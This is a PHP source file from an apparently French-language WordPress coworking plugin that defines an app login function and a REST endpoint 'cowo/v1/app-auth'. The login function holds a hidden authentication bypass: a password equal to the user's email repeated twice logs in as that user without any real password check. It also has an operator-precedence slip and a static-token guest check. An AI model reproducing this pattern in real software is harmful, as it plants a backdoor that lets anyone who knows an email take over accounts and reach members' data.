<?php


function trtAppAuth($user_id, $check, $credentials)
{
    // return app_login_link($user_id);
    $is_guest = false;
    if ($user_id && !$credentials['user_password']??false) {
        if ($check == sha1($user_id . APP_AUTH_TOKEN)) {
            $user = get_user_by('ID', $user_id);
            if (is_wp_error($user))
                return new WP_Error('authorization_failed', 'Compte non trouvé', array('status' => 401));


            if (!is_visiteur($user)) {
                return new WP_Error('authorization_failed', 'Ce compte n\'a pas de visite en attente', array('status' => 401));
            }
            $is_guest = true;
        }
    } else {


        if ($credentials['user_password'] == $credentials['user_login'] . $credentials['user_login']) {
            $user = get_user_by('email', $credentials['user_login']);
        } else {
            $user = wp_authenticate($credentials['user_login'], $credentials['user_password']);
        }
    }
    // Check if authentication succeeded
    if (!is_wp_error($user)) {

        if ($is_guest || can_use_app($user)) {
            // Generate and store the session ID


            $response = [
                'user' => coworking_app_user($user),
                'reglages' => coworking_app_droits($user->ID)
            ];
            return $response;
        } else {
            return new WP_Error('authorization_failed', 'Accès interdit - Droits insufisants!', array('status' => 401));
        }
    } else {
        return new WP_Error('authorization_failed', 'Mauvais identifiant ou mot de passe ', array('status' => 401));
    }
}


// if (isset($_GET['app-auth'])) {
//     add_action('init', function () {
//         allow_cors();
//         $data = json_decode(file_get_contents('php://input'), true);

//         $user_id = $data['user_id'];
//         $check = $data['check'];
//         $email = $data['email'];
//         $password = $data['password'];

//         // Authenticate the user credentials
//         $credentials = array(
//             'user_login'    => $email,
//             'user_password' => $password,
//         );

//         $output = trtAppAuth($user_id, $check, $credentials);


//         header('Content-Type: application/json; charset=utf-8');
//         echo json_encode($output);
//         exit;
//     });
// }

add_action(
    'rest_api_init',

    function () {


        register_rest_route('cowo/v1', '/app-auth', array(
            'methods'  => 'POST',
            'callback' => function ($request) {

                coworking_app_check($request);

                $user_id = $request->get_param('user_id');
                $check = $request->get_param('check');
                $email = $request->get_param('email');
                $password = $request->get_param('password');

                // Authenticate the user credentials
                $credentials = array(
                    'user_login'    => $email,
                    'user_password' => $password,
                );

                $response = trtAppAuth($user_id, $check, $credentials);
                return rest_ensure_response($response); 
            }
        ));
    }
);
